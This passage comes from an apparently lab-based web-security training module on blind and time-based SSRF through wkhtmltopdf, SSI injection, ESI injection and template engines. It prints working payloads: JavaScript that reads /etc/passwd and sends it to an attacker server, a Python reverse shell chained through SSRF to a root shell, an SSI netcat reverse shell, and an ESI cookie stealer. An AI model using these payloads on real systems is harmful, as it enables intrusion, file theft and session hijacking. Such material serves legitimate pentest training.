<p>After submitting the file, we will receive a message from the web application in the browser and a request to our server revealing the application used to convert the HTML document to PDF.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_payload_.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind2__.png" alt="image"></p>
<p>By inspecting the request, we notice <code>wkhtmltopdf</code> in the User-Agent. If we browse <a href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf&#39;s downloads webpage</a>, the below statement catches our attention:</p>
<p><code>Do not use wkhtmltopdf with any untrusted HTML â€“ be sure to sanitize any user-supplied HTML/JS; otherwise, it can lead to the complete takeover of the server it is running on! Please read the project status for the gory details.</code></p>
<p>Great, we can execute JavaScript in wkhtmltopdf! Let us leverage this functionality to read a local file by creating the following HTML document.</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Exfiltration via Blind SSRF<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">var</span> readfile = <span class="hljs-keyword">new</span> XMLHttpRequest(); <span class="hljs-comment">// Read the local file</span>
        <span class="hljs-keyword">var</span> exfil = <span class="hljs-keyword">new</span> XMLHttpRequest(); <span class="hljs-comment">// Send the file to our server</span>
        readfile.open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"file:///etc/passwd"</span>, <span class="hljs-literal">true</span>); 
        readfile.send();
        readfile.onload = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
            <span class="hljs-keyword">if</span> (readfile.readyState === <span class="hljs-number">4</span>) {
                <span class="hljs-keyword">var</span> url = <span class="hljs-string">'http://&lt;SERVICE IP&gt;:&lt;PORT&gt;/?data='</span>+btoa(<span class="hljs-keyword">this</span>.response);
                exfil.open(<span class="hljs-string">"GET"</span>, url, <span class="hljs-literal">true</span>);
                exfil.send();
            }
        }
        readfile.onerror = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{<span class="hljs-built_in">document</span>.write(<span class="hljs-string">'&lt;a&gt;Oops!&lt;/a&gt;'</span>);}
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
     <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>In this case, we are using two <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest">XMLHttpRequest</a> objects, one for reading the local file and another one to send it to our server. Also, we are using the <code>btoa</code> function to send the data encoded in Base64.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_payload_2.png" alt="image"></p>
<p>Let us start an HTTP Server, submit the new HTML file, wait for the response, and decode its contents once the HTML file is processed, as follows.</p>
<p><strong>Netcat Listener</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo nc -nlvp <span class="hljs-number">9090</span>

Listening on <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-number">9090</span>
GET <span class="hljs-regexp">/?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/</span><span class="hljs-number">1.1</span>
<span class="hljs-string">Origin:</span> <span class="hljs-string">file:</span><span class="hljs-comment">//</span>
User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (X11; Linux x86_64) AppleWebKit/</span><span class="hljs-number">534.34</span> (KHTML, like Gecko) wkhtmltopdf Safari/<span class="hljs-number">534.34</span>
<span class="hljs-string">Accept:</span> *<span class="hljs-comment">/*
Connection: Keep-Alive
Accept-Encoding: gzip
Accept-Language: en,*
Host: 10.10.14.221:9090</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/http_server__2.png" alt="image"></p>
<p><strong>Base64 Decoding</strong></p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ echo <span class="hljs-string">"""cm9vdDp4OjA6MDpyb290Oi9yb&lt;SNIP&gt;"""</span> | base64 -d
<span class="hljs-symbol">
root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-string">daemon:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sys:</span><span class="hljs-string">x:</span><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-string">sys:</span><span class="hljs-regexp">/dev:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">sync:</span><span class="hljs-string">x:</span><span class="hljs-number">4</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">sync:</span><span class="hljs-regexp">/bin:/</span>bin/sync
<span class="hljs-string">games:</span><span class="hljs-string">x:</span><span class="hljs-number">5</span>:<span class="hljs-number">60</span>:<span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">games:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">man:</span><span class="hljs-string">x:</span><span class="hljs-number">6</span>:<span class="hljs-number">12</span>:<span class="hljs-string">man:</span><span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/man:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">lp:</span><span class="hljs-string">x:</span><span class="hljs-number">7</span>:<span class="hljs-number">7</span>:<span class="hljs-string">lp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/lpd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">mail:</span><span class="hljs-string">x:</span><span class="hljs-number">8</span>:<span class="hljs-number">8</span>:<span class="hljs-string">mail:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">mail:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">news:</span><span class="hljs-string">x:</span><span class="hljs-number">9</span>:<span class="hljs-number">9</span>:<span class="hljs-string">news:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/news:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">uucp:</span><span class="hljs-string">x:</span><span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-string">uucp:</span><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/uucp:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">proxy:</span><span class="hljs-string">x:</span><span class="hljs-number">13</span>:<span class="hljs-number">13</span>:<span class="hljs-string">proxy:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
www-<span class="hljs-string">data:</span><span class="hljs-string">x:</span><span class="hljs-number">33</span>:<span class="hljs-number">33</span>:www-<span class="hljs-string">data:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">www:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">backup:</span><span class="hljs-string">x:</span><span class="hljs-number">34</span>:<span class="hljs-number">34</span>:<span class="hljs-string">backup:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">backups:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">list:</span><span class="hljs-string">x:</span><span class="hljs-number">38</span>:<span class="hljs-number">38</span>:Mailing List <span class="hljs-string">Manager:</span><span class="hljs-regexp">/var/</span><span class="hljs-string">list:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
<span class="hljs-string">irc:</span><span class="hljs-string">x:</span><span class="hljs-number">39</span>:<span class="hljs-number">39</span>:<span class="hljs-string">ircd:</span><span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/ircd:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">gnats:</span><span class="hljs-string">x:</span><span class="hljs-number">41</span>:<span class="hljs-number">41</span>:Gnats Bug-Reporting System (admin):<span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/gnats:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">nobody:</span><span class="hljs-string">x:</span><span class="hljs-number">65534</span>:<span class="hljs-number">65534</span>:<span class="hljs-string">nobody:</span><span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
<span class="hljs-string">_apt:</span><span class="hljs-string">x:</span><span class="hljs-number">100</span>:<span class="hljs-number">65534</span>::<span class="hljs-regexp">/nonexistent:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
</code></pre>
<p>In the previous section, we exploited an internal application through SSRF and executed remote commands on the target server. The same internal application (<code>internal.app.local</code>) exists in the current scenario. Let us compromise the underlying server, but this time by creating an HTML document with a valid payload for exploiting the local application listening on internal.app.local.</p>
<p>We will use the following reverse shell payload (it is pretty easy to identify that Python is installed once you achieve remote code execution).</p>
<p><strong>Bash Reverse Shell</strong></p>
<pre><code class="lang-bash"><span class="hljs-keyword">export</span> <span class="hljs-type">RHOST</span>=<span class="hljs-string">"&lt;VPN/TUN IP&gt;"</span>;<span class="hljs-keyword">export</span> <span class="hljs-type">RPORT</span>=<span class="hljs-string">"&lt;PORT&gt;"</span>;python -c '<span class="hljs-keyword">import</span> sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(<span class="hljs-string">"RHOST"</span>),<span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"RPORT"</span>))));[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.spawn(<span class="hljs-string">"/bin/sh"</span>)'
</code></pre>
<p>Remember, we need to URL encode our payload. In this case, we need to encode it twice. The end result will be similar to the below.</p>
<p><strong>URL Encoded Payload</strong></p>
<pre><code class="lang-html">export%<span class="hljs-number">2520</span>RHOST%<span class="hljs-number">253</span>D%<span class="hljs-number">252210.10</span><span class="hljs-number">.14</span><span class="hljs-number">.221</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Bexport%<span class="hljs-number">2520</span>RPORT%<span class="hljs-number">253</span>D%<span class="hljs-number">25229090</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>Bpython%<span class="hljs-number">2520</span>-c%<span class="hljs-number">2520</span>%<span class="hljs-number">2527</span>import%<span class="hljs-number">2520</span>sys%<span class="hljs-number">252</span>Csocket%<span class="hljs-number">252</span>Cos%<span class="hljs-number">252</span>Cpty%<span class="hljs-number">253</span>Bs%<span class="hljs-number">253</span>Dsocket.socket%<span class="hljs-number">2528</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">253</span>Bs.connect%<span class="hljs-number">2528</span>%<span class="hljs-number">2528</span>os.getenv%<span class="hljs-number">2528</span>%<span class="hljs-number">2522</span>RHOST%<span class="hljs-number">2522</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">252</span>Cint%<span class="hljs-number">2528</span>os.getenv%<span class="hljs-number">2528</span>%<span class="hljs-number">2522</span>RPORT%<span class="hljs-number">2522</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">253</span>B%<span class="hljs-number">255</span>Bos.dup2%<span class="hljs-number">2528</span>s.fileno%<span class="hljs-number">2528</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">252</span>Cfd%<span class="hljs-number">2529</span>%<span class="hljs-number">2520</span>for%<span class="hljs-number">2520</span>fd%<span class="hljs-number">2520</span>in%<span class="hljs-number">2520</span>%<span class="hljs-number">25280</span>%<span class="hljs-number">252</span>C1%<span class="hljs-number">252</span>C2%<span class="hljs-number">2529</span>%<span class="hljs-number">255</span>D%<span class="hljs-number">253</span>Bpty.spawn%<span class="hljs-number">2528</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>Fbin%<span class="hljs-number">252</span>Fsh%<span class="hljs-number">2522</span>%<span class="hljs-number">2529</span>%<span class="hljs-number">2527</span>
</code></pre>
<p>Now, let us create an HTML file that performs a GET request to internal.app.local, reaches the local application vulnerable to remote code execution via SSRF, and executes our reverse shell.</p>
<p><strong>HTML Payload</strong></p>
<pre><code class="lang-html">&lt;html&gt;
    &lt;body&gt;
        &lt;b&gt;Reverse Shell via Blind SSRF&lt;<span class="hljs-regexp">/b&gt;
        &lt;script&gt;
        var http = new XMLHttpRequest();
        http.open("GET","http:/</span><span class="hljs-regexp">/internal.app.local/load</span>?<span class="hljs-keyword">q</span>=http::<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">5000</span>/runme?<span class="hljs-keyword">x</span>=export%2520RHOST%253D%252210.<span class="hljs-number">10.14</span>.<span class="hljs-number">221</span>%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527<span class="hljs-string">", true); 
        http.send();
        http.onerror = function(){document.write('&lt;a&gt;Oops!&lt;/a&gt;');}
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;</span>
</code></pre>
<p>Once we start a Netcat listener on our machine and submit the HTML file above, we receive a reverse shell coming from <code>internal.app.local</code>.</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nvlp <span class="hljs-number">9090</span>

listening on [any] <span class="hljs-number">9090</span> ...
Connection received on <span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.238</span> <span class="hljs-number">33100</span>

# whoami

whoami
root
</code></pre>
<h2 id="time-based-ssrf">Time-Based SSRF</h2>
<hr>
<p>We can also determine the existence of an SSRF vulnerability by observing time differences in responses. This method is also helpful for discovering internal services.</p>
<p>Let us submit the following document to the PDF application of the previous section and observe the response time.</p>
<p>Code: html</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Time-Based Blind SSRF<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://blah.nonexistent.com"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind_time.png" alt="image"></p>
<p>We can see the service took 10 seconds to respond to the request. If we submit a valid URL inside the HTML document, it will take less time to respond. Remember that <code>internal.app.local</code> was a valid internal application (that we could access through SSRF in the previous section).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/blind_time2.png" alt="image"></p>
<p>In some situations, the application may fail immediately instead of taking more time to respond. For this reason, we need to observe the time differences between requests carefully.</p>
<h2 id="server-side-includes-overview">Server-Side Includes Overview</h2>
<hr>
<p>Server-side includes (<code>SSI</code>) is a technology used by web applications to create dynamic content on HTML pages before loading or during the rendering process by evaluating SSI directives. Some SSI directives are:</p>
<pre><code class="lang-html">// Date
<span class="hljs-comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span>

// Modification date of a file
<span class="hljs-comment">&lt;!--#flastmod file="index.html" --&gt;</span>

// CGI Program results
<span class="hljs-comment">&lt;!--#include virtual="/cgi-bin/counter.pl" --&gt;</span>

// Including a footer
<span class="hljs-comment">&lt;!--#include virtual="/footer.html" --&gt;</span>

// Executing commands
<span class="hljs-comment">&lt;!--#exec cmd="ls" --&gt;</span>

// Setting variables
<span class="hljs-comment">&lt;!--#set var="name" value="Rich" --&gt;</span>

// Including virtual files (same directory)
<span class="hljs-comment">&lt;!--#include virtual="file_to_include.html" --&gt;</span>

// Including files (same directory)
<span class="hljs-comment">&lt;!--#include file="file_to_include.html" --&gt;</span>

// Print all variables
<span class="hljs-comment">&lt;!--#printenv --&gt;</span>
</code></pre>
<p>The use of SSI on a web application can be identified by checking for extensions such as .shtml, .shtm, or .stm. That said, non-default server configurations exist that could allow other extensions (such as .html) to process SSI directives.</p>
<p>We need to submit payloads to the target application, such as the ones mentioned above, through input fields to test for SSI injection. The web server will parse and execute the directives before rendering the page if a vulnerability is present, but be aware that those vulnerabilities can exist in blind format too. Successful SSI injection can lead to extracting sensitive information from local files or even executing commands on the target web server.</p>
<h2 id="ssi-injection-exploitation-example">SSI Injection Exploitation Example</h2>
<hr>
<p>Let us practice SSI Injection against an internet-facing web application (the target can be spawned at the end of this section). Navigate to the end of this section and click on <code>Click here to spawn the target system</code>, then use the provided Pwnbox or a local VM to follow along. By browsing to the spawned target, we come across the below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_1.png" alt="image"></p>
<p>Let us focus on identifying an SSI Injection vulnerability by submitting some of the SSI directives mentioned in the previous section.</p>
<pre><code class="lang-html">1. <span class="hljs-comment">&lt;!--#echo var="DATE_LOCAL" --&gt;</span>
2. <span class="hljs-comment">&lt;!--#printenv --&gt;</span>
</code></pre>
<p><strong>Date</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_1.5.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_2.png" alt="image"></p>
<p><strong>All Variables</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_3.png" alt="image"></p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/SSI_4.png" alt="image"></p>
<p>As we can see, the application is indeed vulnerable to SSI Injection! Now, proceed to the exercise at the end of this section and leverage any SSI directives listed in the previous section that can result in command execution against the underlying system to complete it.</p>
<p>Note: As we saw, running OS commands via SSI on the target application is possible, but who doesn&#39;t love shells? Have in mind the following reverse shell payload that will work even against OpenBSD-netcat that doesn&#39;t include the execute functionality by default. Also note that you won&#39;t be able to obtain a reverse shell in this section&#39;s exercise, due to network restrictions!</p>
<p><strong>Reverse Shell</strong></p>
<pre><code class="lang-html"><span class="hljs-comment">&lt;!--#exec cmd="mkfifo /tmp/foo;nc &lt;PENTESTER IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo|/bin/bash 1&gt;/tmp/foo;rm /tmp/foo" --&gt;</span>
</code></pre>
<ul>
<li><code>mkfifo /tmp/foo</code>: Create a FIFO special file in <code>/tmp/foo</code></li>
<li><code>nc &lt;IP&gt; &lt;PORT&gt; 0&lt;/tmp/foo</code>: Connect to the pentester machine and redirect the standard input descriptor</li>
<li><code>| bin/bash 1&gt;/tmp/foo</code>: Execute <code>/bin/bash</code> redirecting the standard output descriptor to <code>/tmp/foo</code></li>
<li><code>rm /tmp/foo</code>: Cleanup the FIFO file</li>
</ul>
<h2 id="edge-side-includes-esi-">Edge-Side Includes (ESI)</h2>
<hr>
<p>Edge Side Includes (<code>ESI</code>) is an XML-based markup language used to tackle performance issues by enabling heavy caching of Web content, which would be otherwise unstorable through traditional caching protocols. Edge Side Includes (ESI) allow for dynamic web content assembly at the edge of the network (Content Delivery Network, User&#39;s Browser, or Reverse Proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (XML tags).</p>
<p>ESI tags are used to instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional information regarding a web page with an already cached template. This information may come from another server before rendering the web page to the end-user. ESI enable fully cached web pages to include dynamic content.</p>
<p>Edge-Side Include Injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP Response. The root cause of this vulnerability is that HTTP surrogates cannot validate the ESI tag origin. They will gladly parse and evaluate legitimate ESI tags by the upstream server and malicious ESI tags by an attacker.</p>
<p>Although we can identify the use of ESI by inspecting response headers in search for <code>Surrogate-Control: content=&quot;ESI/1.0&quot;</code>, we usually need to use a blind attack approach to detect if ESI is in use or not. Specifically, we can introduce ESI tags to HTTP requests to see if any intermediary proxy is parsing the request and if ESI Injection is possible. Some useful ESI tags are:</p>
<p><strong>ESI Tags</strong></p>
<p>Code: html</p>
<pre><code class="lang-html"><span class="hljs-comment">// Basic detection</span>
&lt;<span class="hljs-string">esi:</span> include src=<span class="hljs-string">http:</span><span class="hljs-comment">//&lt;PENTESTER IP&gt;&gt;</span>

<span class="hljs-comment">// XSS Exploitation Example</span>
&lt;<span class="hljs-string">esi:</span> include src=<span class="hljs-string">http:</span><span class="hljs-comment">//&lt;PENTESTER IP&gt;/&lt;XSSPAYLOAD.html&gt;&gt;</span>

<span class="hljs-comment">// Cookie Stealer (bypass httpOnly flag)</span>
&lt;<span class="hljs-string">esi:</span> include src=<span class="hljs-string">http:</span><span class="hljs-comment">//&lt;PENTESTER IP&gt;/?cookie_stealer.php?=$(HTTP_COOKIE)&gt;</span>

<span class="hljs-comment">// Introduce private local files (Not LFI per se)</span>
&lt;<span class="hljs-string">esi:</span>include src=<span class="hljs-string">"supersecret.txt"</span>&gt;

<span class="hljs-comment">// Valid for Akamai, sends debug information in the response</span>
&lt;<span class="hljs-string">esi:</span>debug/&gt;
</code></pre>
<p>In some cases, we can achieve remote code execution when the application processing ESI directives supports XSLT, a dynamic language used to transform XML files. In that case, we can pass <code>dca=xslt</code> to the payload. The XML file selected will be processed with the possibility of performing XML External Entity Injection Attacks (XXE) with some limitations.</p>
<p><a href="https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/">GoSecure</a> has created a table to help us understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported. Let us provide some explanations regarding the column names of the below table first:</p>
<ul>
<li>Includes: Supports the <code>&lt;esi:includes&gt;</code> directive</li>
<li>Vars: Supports the <code>&lt;esi:vars&gt;</code> directive. Useful for bypassing XSS Filters</li>
<li>Cookie: Document cookies are accessible to the ESI engine</li>
<li>Upstream Headers Required: Surrogate applications will not process ESI statements unless the upstream application provides the headers</li>
<li>Host Allowlist: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>Software</strong></th>
<th style="text-align:center"><strong>Includes</strong></th>
<th style="text-align:center"><strong>Vars</strong></th>
<th style="text-align:center"><strong>Cookies</strong></th>
<th style="text-align:center"><strong>Upstream Headers Required</strong></th>
<th style="text-align:center"><strong>Host Whitelist</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Squid3</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">No</td>
</tr>
<tr>
<td style="text-align:center">Varnish Cache</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">No</td>
<td style="text-align:center">No</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
</tr>
<tr>
<td style="text-align:center">Fastly</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">No</td>
<td style="text-align:center">No</td>
<td style="text-align:center">No</td>
<td style="text-align:center">Yes</td>
</tr>
<tr>
<td style="text-align:center">Akamai ESI Test Server (ETS)</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">No</td>
<td style="text-align:center">No</td>
</tr>
<tr>
<td style="text-align:center">NodeJS esi</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">No</td>
<td style="text-align:center">No</td>
</tr>
<tr>
<td style="text-align:center">NodeJS nodesi</td>
<td style="text-align:center">Yes</td>
<td style="text-align:center">No</td>
<td style="text-align:center">No</td>
<td style="text-align:center">No</td>
<td style="text-align:center">Optional</td>
</tr>
</tbody>
</table>
<h2 id="introduction-to-template-engines">Introduction to Template Engines</h2>
<hr>
<p>Template engines read tokenized strings from template documents and produce rendered strings with actual values in the output document. Templates are commonly used as an intermediary format by web developers to create dynamic website content. Server-Side Template Injection (<code>SSTI</code>) is essentially injecting malicious template directives inside a template, leveraging Template Engines that insecurely mix user input with a given template.</p>
<p>Below you will find some applications that you can run locally to better understand templates. If you are unable to do so, do not worry. The following sections feature exercises with various applications utilizing templates.</p>
<p>Let us now consider the following documents:</p>
<p><strong>app.py</strong></p>
<pre><code class="lang-python"><span class="hljs-comment">#/usr/bin/python3</span>
from flask <span class="hljs-built_in">import</span> *

<span class="hljs-attr">app</span> = Flask(__name__, <span class="hljs-attr">template_folder="./")</span>

@app.route(<span class="hljs-string">"/"</span>)
def index():
    <span class="hljs-attr">title</span> = <span class="hljs-string">"Index Page"</span>
    <span class="hljs-attr">content</span> = <span class="hljs-string">"Some content"</span>
    return render_template(<span class="hljs-string">"index.html"</span>, <span class="hljs-attr">title=title,</span> <span class="hljs-attr">content=content)</span>

<span class="hljs-keyword">if</span> <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    app.run(<span class="hljs-attr">host="127.0.0.1",</span> <span class="hljs-attr">port=5000)</span>
</code></pre>
<p><strong>index.html</strong></p>
<pre><code class="lang-html"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"IE=edge"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
